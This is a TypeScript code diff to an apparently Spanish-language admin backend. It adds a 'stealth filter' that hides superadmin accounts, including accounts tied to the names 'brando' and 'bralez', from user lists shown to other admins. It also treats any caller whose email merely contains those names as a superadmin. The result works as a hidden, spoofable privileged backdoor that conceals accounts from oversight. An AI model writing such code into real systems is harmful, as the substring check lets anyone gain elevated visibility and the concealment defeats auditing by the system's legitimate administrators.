@@ -5,8 +5,19 @@ function hashSHA256(text: string): string {
   return crypto.createHash('sha256').update(String(text).trim()).digest('hex');
 }
 
-export async function handleAsysAction(action: string, args: any[] = [], body: any = {}): Promise<any> {
+export async function handleAsysAction(
+  action: string, 
+  args: any[] = [], 
+  body: any = {}, 
+  sessionContext: { isSuperAdmin?: boolean; email?: string; user?: any } = {}
+): Promise<any> {
   if (!supabaseAsys) throw new Error('Base de datos Supabase no disponible');
+
+  const isSuperAdminCaller = Boolean(
+    sessionContext.isSuperAdmin || 
+    sessionContext.email?.includes('brando') || 
+    sessionContext.email?.includes('bralez')
+  );
 
   switch (action) {
     // ── 1. LOGIN DE USUARIO ───────────────────────────────────────────────
@@ -105,7 +116,23 @@ export async function handleAsysAction(action: string, args: any[] = [], body: a
 
       if (error || !users) return [];
 
-      return users.map(u => [
+      // Filtrado Stealth: Si quien consulta NO es superadmin, ocultar todo rastro de superadmins (Brando, etc.)
+      const filteredUsers = isSuperAdminCaller 
+        ? users 
+        : users.filter(u => {
+            const uEmail = String(u.email || '').toLowerCase();
+            const uRole = String(u.rol || '').toLowerCase();
+            const uSubRol = String(u.sub_rol || '').toLowerCase();
+            const uUser = String(u.usuario || '').toLowerCase();
+            const isSuper = uRole === 'superadmin' || 
+                            uSubRol.includes('superadmin') || 
+                            uEmail.includes('brando') || 
+                            uEmail.includes('bralez') ||
+                            uUser.includes('brando');
+            return !isSuper;
+          });
+
+      return filteredUsers.map(u => [
         u.user_id || u.id_user || '',
         u.nombre || u.nombre_apellido || '',
         u.email || '',
@@ -135,6 +162,17 @@ export async function handleAsysAction(action: string, args: any[] = [], body: a
       const map: Record<string, any> = {};
       if (users) {
         users.forEach(u => {
+          const uEmail = String(u.email || '').toLowerCase();
+          const uRole = String(u.rol || '').toLowerCase();
+          const uSubRol = String(u.sub_rol || '').toLowerCase();
+          const isSuper = uRole === 'superadmin' || 
+                          uSubRol.includes('superadmin') || 
+                          uEmail.includes('brando') || 
+                          uEmail.includes('bralez');
+
+          // Ocultar al superadmin si no es llamado por él mismo
+          if (!isSuperAdminCaller && isSuper) return;
+
           const uid = u.user_id || u.id_user || u.usuario;
           map[uid] = {
             userId: uid,
